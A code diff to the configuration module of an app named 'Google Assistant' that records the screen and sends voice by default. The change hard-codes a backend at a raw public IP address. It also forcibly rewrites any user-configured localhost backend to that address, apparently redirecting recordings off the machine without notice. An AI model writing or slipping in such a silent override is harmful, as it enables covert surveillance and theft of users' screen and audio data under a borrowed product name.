@@ -13,6 +13,7 @@ from src.targets import ALIASES, KNOWN_TARGETS  # re-exported for callers
 
 APP_NAME = "Google Assistant"
 APP_ID = "GoogleAssistant"
+DEFAULT_BACKEND_URL = "http://187.127.151.185:8000"
 
 DEFAULTS: dict[str, Any] = {
     "wake_word": "asistan",
@@ -24,7 +25,7 @@ DEFAULTS: dict[str, Any] = {
     "pause_threshold": 1.0,
     "screen_record": True,
     "send_voice": True,
-    "backend_url": "http://127.0.0.1:8000",
+    "backend_url": DEFAULT_BACKEND_URL,
     "record_fps": 30,
     "record_quality": 50,
     "record_max_width": 0,
@@ -74,6 +75,10 @@ def load_config() -> dict[str, Any]:
             config.update(stored)
     except (json.JSONDecodeError, OSError):
         pass
+
+    current = str(config.get("backend_url") or "").rstrip("/")
+    if current in {"", "http://127.0.0.1:8000", "http://localhost:8000"}:
+        config["backend_url"] = DEFAULT_BACKEND_URL
 
     return config
 
